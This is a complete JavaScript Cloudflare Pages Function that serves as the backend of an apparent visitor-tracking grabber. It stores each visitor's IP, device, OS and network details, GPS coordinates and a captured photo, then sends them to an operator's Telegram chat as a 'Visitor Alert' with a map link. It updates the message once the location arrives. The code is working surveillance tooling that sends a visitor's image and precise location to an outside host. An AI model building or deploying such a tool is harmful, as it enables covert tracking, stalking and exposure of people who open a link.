export async function onRequestPost({ request, env }) {
  let body = {};

  try {
    body = await request.json();
    const id = body.session_id;

    const ip = request.headers.get("CF-Connecting-IP");

    let session = await env.VISITOR_KV.get(id);
    session = session ? JSON.parse(session) : {};

    Object.assign(session, body, {
      ip,
      updated: new Date().toISOString()
    });

    await env.VISITOR_KV.put(id, JSON.stringify(session));

    // =========================
    // ✅ FINAL EVENT (SEND ONCE)
    // =========================
    if (body.event === "final") {

      const key = `msg_${id}`;
      const exists = await env.VISITOR_KV.get(key);

      if (!exists) {
        const messageId = await sendTelegram(env, session);

        await env.VISITOR_KV.put(key, messageId, {
          expirationTtl: 3600
        });
      }
    }

    // =========================
    // ✅ GPS EVENT (EDIT MESSAGE)
    // =========================
    if (body.event === "gps" && session.lat && session.lng) {

      const key = `msg_${id}`;
      const messageId = await env.VISITOR_KV.get(key);

      if (messageId) {
        await editTelegram(env, messageId, session);
      }
    }

    return new Response(JSON.stringify({ ok: true }), {
      headers: { "Content-Type": "application/json" }
    });

  } catch (err) {

    await safeTelegram(env, {
      error: err.message,
      raw: JSON.stringify(body)
    });

    return new Response(JSON.stringify({
      error: err.message
    }), {
      status: 500,
      headers: { "Content-Type": "application/json" }
    });
  }
}


// =======================
// TELEGRAM SAFE WRAPPER
// =======================
async function safeTelegram(env, s) {
  try {
    await sendTelegram(env, s);
  } catch (e) {
    console.log("Telegram failed (1st):", e);

    try {
      await sendTelegram(env, s);
    } catch (e2) {
      console.log("Telegram failed (retry):", e2);

      await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
        method: "POST",
        body: new URLSearchParams({
          chat_id: env.CHAT_ID,
          text: "❌ Telegram failed twice:\n" + e2.message
        })
      });
    }
  }
}


// =======================
// TELEGRAM MAIN (SEND)
// =======================
async function sendTelegram(env, s) {

  const map = s.lat && s.lng
    ? `https://maps.google.com/?q=${s.lat},${s.lng}`
    : "Waiting for location...";

  const text = buildText(s, map);

  let result;

  // 📸 IMAGE PATH
  if (s.image && s.image.startsWith("data:image") && s.image.length < 700000) {

    const res = await fetch(s.image);
    const blob = await res.blob();

    const form = new FormData();
    form.append("chat_id", env.CHAT_ID);
    form.append("photo", blob, "visitor.jpg");
    form.append("caption", text);
    form.append("parse_mode", "HTML");

    const tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    });

    result = await tg.json();

  } else {

    // 📝 TEXT PATH
    const tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      body: new URLSearchParams({
        chat_id: env.CHAT_ID,
        text,
        parse_mode: "HTML"
      })
    });

    result = await tg.json();
  }

  if (!result.ok) {
    throw new Error(JSON.stringify(result));
  }

  return result.result.message_id;
}


// =======================
// TELEGRAM EDIT (UPDATE)
// =======================
async function editTelegram(env, messageId, s) {

  const map = `https://maps.google.com/?q=${s.lat},${s.lng}`;
  const text = buildText(s, map);

  // try caption edit (for photo)
  let tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/editMessageCaption`, {
    method: "POST",
    body: new URLSearchParams({
      chat_id: env.CHAT_ID,
      message_id: messageId,
      caption: text,
      parse_mode: "HTML"
    })
  });

  let result = await tg.json();

  // fallback → text edit
  if (!result.ok) {
    tg = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/editMessageText`, {
      method: "POST",
      body: new URLSearchParams({
        chat_id: env.CHAT_ID,
        message_id: messageId,
        text,
        parse_mode: "HTML"
      })
    });

    result = await tg.json();

    if (!result.ok) {
      throw new Error("Edit failed: " + JSON.stringify(result));
    }
  }
}


// =======================
// TEXT BUILDER
// =======================
function buildText(s, map) {
  return `
🚨 <b>Visitor Alert</b>

🕒 <b>Time:</b> ${formatTime(s.updated)}
🌐 <b>IP:</b> ${s.ip || "-"}

📱 <b>Device:</b> ${shortDevice(s.device)}
💻 <b>OS:</b> ${s.os || "-"}
🌍 <b>Browser:</b> ${getBrowser(s.device)}

📡 <b>Network:</b> ${s.network || "-"}

📍 <b>Location:</b>
Lat: ${s.lat || "Fetching..."}
Lng: ${s.lng || "Fetching..."}

🔗 <a href="${map}">Open Map</a>

${s.error ? `\n❌ <b>Error:</b> ${s.error}` : ""}
`;
}


// =======================
// HELPERS
// =======================
function formatTime(t) {
  return new Date(t).toLocaleString("en-IN", {
    timeZone: "Asia/Kolkata"
  });
}

function shortDevice(ua = "") {
  if (ua.includes("Android")) return "Android Mobile";
  if (ua.includes("iPhone")) return "iPhone";
  if (ua.includes("Windows")) return "Windows PC";
  return "Unknown Device";
}

function getBrowser(ua = "") {
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Safari")) return "Safari";
  if (ua.includes("Firefox")) return "Firefox";
  return "Unknown";
}
